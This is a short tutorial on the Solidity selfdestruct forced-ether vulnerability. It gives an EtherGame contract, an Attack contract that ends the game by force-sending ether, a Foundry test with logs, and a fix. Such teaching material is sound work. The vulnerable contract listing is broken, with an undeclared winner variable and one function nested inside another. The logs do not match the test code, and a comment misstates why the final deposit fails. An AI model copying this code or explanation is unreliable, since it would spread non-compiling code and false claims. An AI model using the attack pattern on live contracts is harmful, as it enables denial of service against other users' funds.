Code is in the here.(https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Selfdestruct.sol)

---

# EtherGame

``` text copy
contract EtherGame {
    uint constant public targetAmount = 7 ether;
    address public owner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        uint balance = address(this).balance; // vulnerable
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }

        function claimReward() public {
            require(msg.sender == winner, "No winner");
            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }
}
```

---

# Attack

``` text copy
contract Attack {
    EtherGame etherGame;
        constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }
    
    function dos() public payable {
        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```

---

# ContractTest

``` text copy
contract ContractTest is Test {
    EtherGame EtherGameContract;
    Attack AttackerContract;

    address alice;
    address eve;
    function setUp() public {
        EtherGameContract = new EtherGame();
        //alice = vm.addr(1);
        alice = makeAddr("alice");
        // eve = vm.addr(2);
        eve = makeAddr("eve");
        vm.deal(alice, 1 ether);
        vm.deal(eve, 2 ether);
    }

    function testFailSelfdestruct() public {
        console.log("Alice balance", alice.balance);
        console.log("Eve balance", eve.balance);
        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGameContract.deposit{value: 1 ether}();
        console.log("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameContract.deposit{value: 1 ether}();
        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
        AttackerContract = new Attack(EtherGameContract);
        AttackerContract.dos{value: 5 ether}();
        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
        console.log("Exploit completed, Game is over");
        vm.prank(eve);
        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
    }
}
```

**forge test — contracts ./src/test/SelfDestruct.sol -vvvv**

``` text copy
Logs:
    Alice balance 1000000000000000000
    Eve balance 1000000000000000000
    Alice deposit 1 Ether...
    Eve deposit 1 Ether...
    Balance of EtherGameContract 2000000000000000000
    Attack...
    Balance of EtherGameContract 7000000000000000000
    Exploit completed, Game is over
```

``` text copy
console.log("Alice deposit 1 Ether...");
vm.prank(alice);
EtherGameContract.deposit{value: 1 ether}();
console.log("Eve deposit 1 Ether...");
vm.prank(eve);
EtherGameContract.deposit{value: 1 ether}();
```

``` text copy
AttackerContract = new Attack(EtherGameContract);
AttackerContract.dos{value: 5 ether}();

console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
console.log("Exploit completed, Game is over");

vm.prank(eve);
EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
```

---

# What is the problem ?

``` text copy
uint balance = address(this).balance;   // vulnerable
```
You assign the adress’ balance to the balance variable but Hacker could sent the ether this address with selfdestruct method.

# How to solve ?

``` text copy
contract EtherGame {
    uint constant public targetAmount = 7 ether;
    address public winner;
    uint public balance;
    
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        balance +=msg.value;
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

** A big thanks to you for read this type. **